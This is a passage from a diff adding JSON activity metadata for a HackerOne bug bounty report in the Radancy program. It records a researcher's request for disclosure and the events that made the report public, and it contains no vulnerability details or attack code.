+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 18219397,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello @bamie,\nCan you please disclouse this report ?\n",
+      "automated_response": false,
+      "created_at": "2022-09-01T15:47:37.288Z",
+      "updated_at": "2022-09-01T15:47:37.288Z",
+      "actor": {
+        "username": "mouhannadlrx",
+        "cleared": false,
+        "verified": false,
+        "url": "/mouhannadlrx",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/qe0drn28g8oeabsfi8u540gx3nwb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 23284676,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-08-13T06:39:39.462Z",
+      "updated_at": "2023-08-13T06:39:39.462Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "mouhannadlrx",
+        "cleared": false,
+        "verified": false,
+        "url": "/mouhannadlrx",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/qe0drn28g8oeabsfi8u540gx3nwb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 23716960,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-09-12T06:39:39.773Z",
+      "updated_at": "2023-09-12T06:39:39.773Z",
+      "actor": {
+        "url": "/radancy",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/lozsi85c1p7jtt7jphw7vzpyocr2/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "profile": {
+          "name": "Radancy"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
